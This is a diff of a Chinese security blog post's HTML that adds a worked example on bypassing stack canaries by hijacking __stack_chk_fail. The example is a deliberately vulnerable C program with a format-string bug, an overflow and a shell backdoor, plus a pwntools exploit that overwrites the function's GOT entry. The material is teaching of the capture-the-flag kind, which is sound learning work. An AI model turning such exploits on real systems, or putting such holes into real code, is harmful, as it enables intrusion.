@@ -389,14 +389,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.5k
+                    3.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    15 分
                 </div>
                 
 
@@ -836,8 +836,49 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 
 <p><img src="/2023/04/09/canary/6.png"></p>
 <h2 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在开启canary保护的程序中，如果canary不对，程序会转到**__stack_chk_fail函数执行**。__stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p>
-<h2 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
-<p>如果我们溢出的足够大，大到能够覆盖到fs/gs寄存器对应偏移位的值，我们就可以修改canary为我们设计好的值，这样在程序检测时就会和我们匹配的值进行检测，从而绕过canary保护。在初始化canary时，fs寄存器指向的位置是TLS结构体，而fs指向的位置加上0x28偏移的位置取出来的canary就在TLS结构体里面。</p>
+<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>测试代码：</p>
+<ul>
+<li>程序存在格式化字符串漏洞，且有后门函数</li>
+<li>利用格式化字符串漏洞任意地址写，将__stack_chk_fail的got表项内容替换为getshell函数地址</li>
+<li>触发Canary，执行__stack_chk_fail ==&gt; getshell</li>
+</ul>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -m32 stack_chk_fail.c -o stack_chk_fail</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span>
+
+<span class="token comment">#格式化字符串地址相对于格式化字符串的偏移为10</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p><strong>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</strong></p>
+<p>如果我们溢出的足够大，大到能够覆盖到fs/gs寄存器对应偏移位的值，我们就可以修改canary为我们设计好的值，这样在程序检测时就会和我们匹配的值进行检测，从而绕过canary保护。在初始化canary时，<strong>fs寄存器指向的位置是TLS结构体</strong>，而fs指向的位置加上0x28偏移的位置取出来的canary就在TLS结构体里面。</p>
 
                 
             </div>
@@ -1219,7 +1260,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">20.5k</span>
+                        class="white-color">20.7k</span>
             
             
             
